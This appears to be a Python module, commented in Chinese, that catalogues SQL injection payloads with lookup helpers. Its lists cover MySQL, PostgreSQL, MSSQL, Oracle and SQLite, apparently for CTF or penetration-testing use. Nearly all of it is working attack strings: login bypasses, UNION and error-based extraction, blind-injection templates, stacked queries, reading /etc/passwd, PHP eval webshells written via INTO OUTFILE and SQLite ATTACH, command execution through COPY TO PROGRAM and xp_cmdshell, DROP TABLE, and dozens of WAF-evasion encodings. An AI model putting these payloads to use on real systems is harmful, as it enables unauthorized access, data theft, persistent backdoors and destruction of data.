# -*- coding: utf-8 -*-
"""SQL 注入 Payload 生成器.

覆盖:
    - 联合查询注入 (UNION SELECT) — MySQL/PG/MSSQL/Oracle/SQLite
    - 报错注入 (Error-based) — 12+ 种手法
    - 布尔盲注 (Boolean-based) — 6 种判断方式
    - 时间盲注 (Time-based) — 5 种延迟手法
    - 堆叠查询 (Stacked Queries)
    - INSERT / UPDATE / DELETE 注入
    - 无列名注入
    - information_schema 被禁绕过
    - WAF 绕过技 — 30+ 种
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  探测与检测 Payload
# ═══════════════════════════════════════════════════════════

DETECTION: Dict[str, List[str]] = {
    "闭合探测": [
        "'", '"', "')", '")', "'))",
        "\\", "';", "'; --", "'; #",
    ],
    "万能密码": [
        "admin' OR '1'='1",
        "admin' OR 1=1-- ",
        "admin' OR 1=1#",
        "admin'||1=1-- ",
    ],
    "列数探测": [
        "' ORDER BY 1-- ",
        "' ORDER BY 2-- ",
        "' ORDER BY 3-- ",
        "' ORDER BY 5-- ",
        "' ORDER BY 10-- ",
        "' ORDER BY 20-- ",
    ],
    "回显位探测": [
        "' UNION SELECT NULL-- ",
        "' UNION SELECT NULL,NULL-- ",
        "' UNION SELECT NULL,NULL,NULL-- ",
        "' UNION SELECT 1,2,3-- ",
        "' UNION SELECT 1,2,3,4,5-- ",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
    ],
    "数据库指纹": [
        "' UNION SELECT @@version,NULL-- ",
        "' UNION SELECT version(),NULL-- ",
        "' UNION SELECT banner,NULL FROM v$version WHERE rownum=1-- ",
        "' UNION SELECT sqlite_version(),NULL-- ",
    ],
}


# ═══════════════════════════════════════════════════════════
#  利用 Payload — 按数据库分
# ═══════════════════════════════════════════════════════════

EXPLOIT: Dict[str, List[Dict[str, str]]] = {
    # ── MySQL ────────────────────────────────────────────
    "MySQL": [
        # ── 认证/登录绕过 ──
        {"name": "🔑 万能密码-OR", "payload": "admin' OR '1'='1", "tip": "经典万能密码，登录绕过首选"},
        {"name": "🔑 万能密码-OR 1=1", "payload": "admin' OR 1=1-- ", "tip": "-- 注释掉后续SQL"},
        {"name": "🔑 万能密码-OR 1=1#", "payload": "admin' OR 1=1#", "tip": "# 注释，MySQL 特有"},
        {"name": "🔑 万能密码-永真", "payload": "' OR '1'='1' --", "tip": "无需用户名，直接进"},
        {"name": "🔑 万能密码-括号", "payload": "admin') OR ('1'='1", "tip": "括号闭合变体"},
        {"name": "🔑 万能密码-双引号", 'payload': 'admin\" OR \"1\"=\"1', "tip": "双引号闭合"},
        {"name": "🔑 注释绕过-末尾", "payload": "admin' --", "tip": "注释掉密码校验部分"},
        {"name": "🔑 UNION绕过", "payload": "' UNION SELECT 1,'admin','fake'-- ", "tip": "构造假密码哈希注入"},
        # ── 联合查询 ──
        {"name": "当前库名", "payload": "' UNION SELECT database(),NULL,NULL-- "},
        {"name": "所有库名", "payload": "' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata-- "},
        {"name": "表名 (当前库)", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- "},
        {"name": "列名", "payload": "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- "},
        {"name": "读数据", "payload": "' UNION SELECT group_concat(COL1,0x3a,COL2),NULL,NULL FROM TABLE_NAME-- "},
        {"name": "读文件", "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- "},
        {"name": "写 Shell", "payload": "' UNION SELECT '<?=eval($_POST[1]);?>',NULL,NULL INTO OUTFILE '/var/www/html/s.php'-- "},
        # 报错注入 — 10 种
        {"name": "报错-updatexml", "payload": "' AND updatexml(1,concat(0x7e,database()),1)-- "},
        {"name": "报错-extractvalue", "payload": "' AND extractvalue(1,concat(0x7e,database()))-- "},
        {"name": "报错-floor", "payload": "' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "},
        {"name": "报错-exp", "payload": "' AND exp(~(SELECT * FROM (SELECT database())a))-- "},
        {"name": "报错-geometrycollection", "payload": "' AND geometrycollection((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "报错-polygon", "payload": "' AND polygon((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "报错-multipoint", "payload": "' AND multipoint((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "报错-multilinestring", "payload": "' AND multilinestring((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "报错-linestring", "payload": "' AND linestring((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "报错-name_const", "payload": "' AND (SELECT * FROM (SELECT name_const(database(),1),name_const(database(),1))a)-- "},
        # 时间盲注 — 4 种延时
        {"name": "时间盲注-sleep", "payload": "' AND IF(1=1,sleep(3),0)-- "},
        {"name": "时间盲注-benchmark", "payload": "' AND IF(1=1,benchmark(5000000,sha1('x')),0)-- "},
        {"name": "时间盲注-get_lock", "payload": "' AND get_lock('test',3)-- "},
        {"name": "时间盲注-笛卡尔积", "payload": "' AND (SELECT count(*) FROM information_schema.columns a,information_schema.columns b,information_schema.columns c)>0-- "},
        # 堆叠注入
        {"name": "堆叠-show tables", "payload": "'; SHOW TABLES-- "},
        {"name": "堆叠-desc 表结构", "payload": "'; DESC users-- "},
        {"name": "堆叠-预编译绕过", "payload": "'; SET @a=CONCAT('SEL','ECT flag FROM flag');PREPARE s FROM @a;EXECUTE s-- "},
        {"name": "堆叠-handler读表", "payload": "'; HANDLER users OPEN AS h; HANDLER h READ FIRST; HANDLER h CLOSE-- "},
        # 无列名注入
        {"name": "无列名-别名法", "payload": "' UNION SELECT 1,2,3 FROM (SELECT 1,2,3 UNION SELECT * FROM flag)a-- "},
        {"name": "无列名-join法", "payload": "' UNION SELECT * FROM (SELECT * FROM flag AS a JOIN flag AS b)c-- "},
        {"name": "无列名-反引号下标", "payload": "' UNION SELECT 1,group_concat(`2`),3 FROM (SELECT 1,2,3 UNION SELECT * FROM flag)a-- "},
        # information_schema 被禁
        {"name": "无infoschema-innodb", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- "},
        {"name": "无infoschema-sys", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM sys.schema_table_statistics_with_buffer-- "},
        {"name": "无infoschema-暴力猜表", "payload": "' AND (SELECT count(*) FROM flag)>0-- "},
    ],

    # ── PostgreSQL ───────────────────────────────────────
    "PostgreSQL": [
        {"name": "当前库", "payload": "' UNION SELECT current_database(),NULL-- "},
        {"name": "表名", "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- "},
        {"name": "列名", "payload": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TBL'-- "},
        {"name": "读文件-pg_read_file", "payload": "' UNION SELECT pg_read_file('/etc/passwd'),NULL-- "},
        {"name": "读文件-lo_import", "payload": "' UNION SELECT lo_import('/etc/passwd'),NULL-- "},
        {"name": "RCE-COPY", "payload": "'; COPY (SELECT '') TO PROGRAM 'id'-- "},
        {"name": "报错-cast", "payload": "' AND 1=cast(version() AS int)-- "},
        {"name": "时间盲注-pg_sleep", "payload": "' AND (SELECT 1 FROM pg_sleep(3))-- "},
        {"name": "堆叠-建表", "payload": "'; CREATE TABLE test(f TEXT); COPY test FROM PROGRAM 'id';-- "},
    ],

    # ── MSSQL ────────────────────────────────────────────
    "MSSQL": [
        {"name": "当前库", "payload": "' UNION SELECT DB_NAME(),NULL-- "},
        {"name": "表名", "payload": "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- "},
        {"name": "列名", "payload": "' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('TBL')-- "},
        {"name": "RCE-xp_cmdshell", "payload": "'; EXEC xp_cmdshell 'whoami'-- "},
        {"name": "启用xp_cmdshell", "payload": "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- "},
        {"name": "报错-convert", "payload": "' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- "},
        {"name": "报错-cast", "payload": "' AND 1=cast((SELECT DB_NAME()) AS int)-- "},
        {"name": "时间盲注-waitfor", "payload": "'; IF 1=1 WAITFOR DELAY '0:0:3'-- "},
        {"name": "堆叠-删表", "payload": "'; DROP TABLE users-- "},
    ],

    # ── Oracle ───────────────────────────────────────────
    "Oracle": [
        {"name": "版本", "payload": "' UNION SELECT banner FROM v$version WHERE rownum=1-- "},
        {"name": "表名", "payload": "' UNION SELECT table_name FROM all_tables-- "},
        {"name": "列名", "payload": "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='TBL'-- "},
        {"name": "报错-utl_inaddr", "payload": "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))-- "},
        {"name": "报错-ctxsys", "payload": "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))-- "},
        {"name": "时间盲注-DBMS_LOCK", "payload": "' AND DBMS_LOCK.SLEEP(3)=1-- "},
        {"name": "时间盲注-笛卡尔积", "payload": "' AND (SELECT count(*) FROM all_objects t1,all_objects t2,all_objects t3,all_objects t4)>0-- "},
    ],

    # ── SQLite ───────────────────────────────────────────
    "SQLite": [
        {"name": "表名", "payload": "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "},
        {"name": "列名(SQL)", "payload": "' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='TBL'-- "},
        {"name": "读数据", "payload": "' UNION SELECT group_concat(COL1||':'||COL2) FROM TBL-- "},
        {"name": "时间盲注-randomblob", "payload": "' AND 1=randomblob(300000000)-- "},
        {"name": "时间盲注-zeroblob", "payload": "' AND 1=zeroblob(300000000)-- "},
        {"name": "写文件", "payload": "'; ATTACH DATABASE '/var/www/html/s.php' AS x; CREATE TABLE x.y(z TEXT); INSERT INTO x.y VALUES('<?=eval($_POST[1]);?>')-- "},
    ],
}


# ═══════════════════════════════════════════════════════════
#  INSERT / UPDATE / DELETE 注入
# ═══════════════════════════════════════════════════════════

DML_INJECTION: Dict[str, List[Dict[str, str]]] = {
    "INSERT 注入": [
        {"name": "子查询插入", "payload": "username=(SELECT database())&password=test"},
        {"name": "concat_ws 拼接", "payload": "username=concat_ws(',',(SELECT username),(SELECT password))"},
        {"name": "十六进制编码", "payload": "username=0x61646d696e272c2873656c6563742064617461626173652829292c2740"},
    ],
    "UPDATE 注入": [
        {"name": "条件注入", "payload": "password=',test') WHERE 1=1#"},
        {"name": "盲注嵌入", "payload": "password=',test') WHERE (SELECT length(database())=8)#"},
    ],
    "DELETE 注入": [
        {"name": "范围删除", "payload": "id=1 OR id=2 OR id=3#"},
        {"name": "条件探测", "payload": "id=1 OR (SELECT count(*) FROM flag)>0#"},
    ],
}


# ═══════════════════════════════════════════════════════════
#  WAF 绕过技巧
# ═══════════════════════════════════════════════════════════

WAF_BYPASS: Dict[str, List[Dict[str, str]]] = {
    "关键字变形": [
        {"name": "大小写混合", "tip": "sElEcT / uNiOn / wHeRe", "eg": "'/**/sElEcT/**/1,2,3-- "},
        {"name": "双写绕过", "tip": "seselectlect / ununionion / anandd", "eg": "' seselectlect 1,2,3-- "},
        {"name": "反引号包裹", "tip": "`select` / `union` / `and`", "eg": "' `union` `select` 1,2,3-- "},
        {"name": "注释穿插", "tip": "s/*!*/el/*!*/ect", "eg": "' un/*!*/ion sel/*!*/ect 1,2,3-- "},
        {"name": "内联版本注释", "tip": "/*!50000select*/", "eg": "' /*!50000union*/ /*!50000select*/ 1,2,3-- "},
        {"name": "换行拆分", "tip": "s\\ne\\nl\\ne\\nc\\nt", "eg": "' un%0aion sel%0aect 1,2,3-- "},
    ],
    "逻辑等价": [
        {"name": "运算符替换", "tip": "or→||  and→&&  not→!  xor→^", "eg": "' || 1=1 || '"},
        {"name": "true/false", "tip": "1=1→true  1=2→false", "eg": "' AND true-- "},
        {"name": "数值变形", "tip": "1→2-1  id=1→id=3-2", "eg": "' UNION SELECT 2-1,3-1,4-1-- "},
        {"name": "浮点绕过", "tip": "1.0 / -1.1 / +1.0", "eg": "1.0 UNION SELECT 1,2,3-- "},
        {"name": "科学计数", "tip": "1e0 / 1e1 / -1e0", "eg": "1e0UNION SELECT 1,2,3-- "},
        {"name": "null安全等于", "tip": "<=> 替代 =", "eg": "' AND 1 <=> 1-- "},
    ],
    "编码绕过": [
        {"name": "URL编码", "tip": "空格→%20 '→%27 #→%23", "eg": "%27%20UNION%20SELECT%201,2,3%23"},
        {"name": "双重URL编码", "tip": "'→%2527 空格→%2520", "eg": "%2527%2520UNION%2520SELECT%25201%2523"},
        {"name": "Unicode编码", "tip": "'→%u0027 空格→%u0020", "eg": "%u0027%20UNION%20SELECT%201,2%23"},
        {"name": "HTML实体编码", "tip": "'→&#39; (→&#40;", "eg": "&#39; UNION SELECT 1,2,3#"},
        {"name": "16进制字符串", "tip": "select→0x73656C656374", "eg": "' UNION 0x73656C656374 1,2,3-- "},
        {"name": "char()函数", "tip": "select→char(115,101,108,101,99,116)", "eg": "' UNION char(115,101,108,101,99,116) 1,2,3-- "},
        {"name": "from_base64", "tip": "MySQL: from_base64('c2VsZWN0')", "eg": "' UNION from_base64('c2VsZWN0') 1,2,3-- "},
        {"name": "unhex", "tip": "MySQL: unhex('73656c656374')", "eg": "' UNION unhex('73656c656374') 1,2,3-- "},
    ],
    "空白符绕过": [
        {"name": "水平制表 %09", "tip": "TAB 替代空格", "eg": "'%09UNION%09SELECT%091,2,3-- "},
        {"name": "换行 %0a", "tip": "LF 替代空格", "eg": "'%0aUNION%0aSELECT%0a1,2,3-- "},
        {"name": "垂直制表 %0b", "tip": "VT 替代空格", "eg": "'%0bUNION%0bSELECT%0b1,2,3-- "},
        {"name": "换页 %0c", "tip": "FF 替代空格", "eg": "'%0cUNION%0cSELECT%0c1,2,3-- "},
        {"name": "回车 %0d", "tip": "CR 替代空格", "eg": "'%0dUNION%0dSELECT%0d1,2,3-- "},
        {"name": "全角空格 %a0", "tip": "NBSP 替代空格", "eg": "'%a0UNION%a0SELECT%a01,2,3-- "},
        {"name": "括号替代空格", "tip": "UNION(SELECT(1),(2),(3))", "eg": "'UNION(SELECT(1),(2),(3))-- "},
    ],
    "函数替换": [
        {"name": "substring→mid/left", "tip": "mid(pwd,1,1) left(pwd,1)", "eg": "' AND mid(database(),1,1)='t'-- "},
        {"name": "ascii→ord/hex", "tip": "ord('a')=97 hex('a')=61", "eg": "' AND ord(mid(database(),1,1))=116-- "},
        {"name": "length→char_length", "tip": "char_length() 替代", "eg": "' AND char_length(database())=4-- "},
        {"name": "if→case when", "tip": "case when 1=1 then sleep(3) else 0 end", "eg": "' AND (case when 1=1 then sleep(3) else 0 end)-- "},
        {"name": "strcmp 替代等号", "tip": "strcmp('a','a')=0", "eg": "' AND strcmp(database(),'test')=0-- "},
        {"name": "greatest/least", "tip": "greatest(1,2)=2 least(1,2)=1", "eg": "' AND greatest((SELECT count(*) FROM flag),0)>0-- "},
        {"name": "coalesce", "tip": "coalesce((SELECT 1),0)=1", "eg": "' AND coalesce((SELECT count(*) FROM flag),0)=1-- "},
        {"name": "isnull", "tip": "isnull(null)=1 isnull(1)=0", "eg": "' AND isnull((SELECT 1 FROM flag))=0-- "},
    ],
    "宽字节注入": [
        {"name": "%df 配合 %27", "tip": "%df' → 運' (吃掉反斜杠)", "eg": "%df' OR 1=1#"},
        {"name": "%81 配合 %27", "tip": "%81' 同理吃反斜杠", "eg": "%81' OR 1=1#"},
        {"name": "高阶宽字节", "tip": "%df%5c%27 → 二次编码", "eg": "%df%5c%27 OR 1=1%23"},
    ],
}


# ═══════════════════════════════════════════════════════════
#  盲注逐字符提取模板
# ═══════════════════════════════════════════════════════════

BLIND_TEMPLATES: Dict[str, str] = {
    "布尔-逐字 (MySQL)": "1' AND SUBSTRING(({query}),{pos},1)='{char}'-- ",
    "布尔-LIKE前缀 (MySQL)": "1' AND ({query}) LIKE '{prefix}%'-- ",
    "布尔-REGEXP (MySQL)": "1' AND ({query}) REGEXP '^{prefix}'-- ",
    "布尔-LEFT (MySQL)": "1' AND LEFT(({query}),{pos})='{full}'-- ",
    "二分法 (MySQL)": "1' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- ",
    "时间-sleep (MySQL)": "1' AND IF(SUBSTRING(({query}),{pos},1)='{char}',sleep(2),0)-- ",
    "时间-pg_sleep (PG)": "1' AND (SELECT CASE WHEN SUBSTRING(({query}),{pos},1)='{char}' THEN pg_sleep(2) ELSE pg_sleep(0) END)-- ",
    "时间-waitfor (MSSQL)": "1'; IF SUBSTRING(({query}),{pos},1)='{char}' WAITFOR DELAY '0:0:2'-- ",
    "时间-DBMS_LOCK (Oracle)": "1' AND (SELECT CASE WHEN SUBSTR(({query}),{pos},1)='{char}' THEN dbms_pipe.receive_message(('a'),2) ELSE NULL END FROM dual)-- ",
    "时间-randomblob (SQLite)": "1' AND (CASE WHEN SUBSTR(({query}),{pos},1)='{char}' THEN randomblob(300000000) ELSE 0 END)-- ",
}


# ═══════════════════════════════════════════════════════════
#  查询接口
# ═══════════════════════════════════════════════════════════

def get_detection(db_type: str = "") -> dict:
    if db_type and db_type in DETECTION:
        return {db_type: DETECTION[db_type]}
    return DETECTION


def get_exploit(db_type: str = "") -> dict:
    if db_type and db_type in EXPLOIT:
        return {db_type: EXPLOIT[db_type]}
    return EXPLOIT


def get_waf_bypass(category: str = "") -> dict:
    if category and category in WAF_BYPASS:
        return {category: WAF_BYPASS[category]}
    return WAF_BYPASS


def get_blind_template(db_type: str = "") -> dict:
    if db_type:
        return {k: v for k, v in BLIND_TEMPLATES.items() if db_type.lower() in k.lower()}
    return BLIND_TEMPLATES


def get_dml_injection(operation: str = "") -> dict:
    if operation and operation in DML_INJECTION:
        return {operation: DML_INJECTION[operation]}
    return DML_INJECTION


def search_payload(keyword: str) -> list:
    results = []
    for category, payloads in EXPLOIT.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("name", "").lower():
                results.append({"category": category, **p})
    for cat, items in WAF_BYPASS.items():
        for item in items:
            if keyword.lower() in item.get("eg", "").lower() or keyword.lower() in item["tip"].lower():
                results.append({"category": f"WAF/{cat}", "name": item["name"], "payload": item["eg"]})
    return results
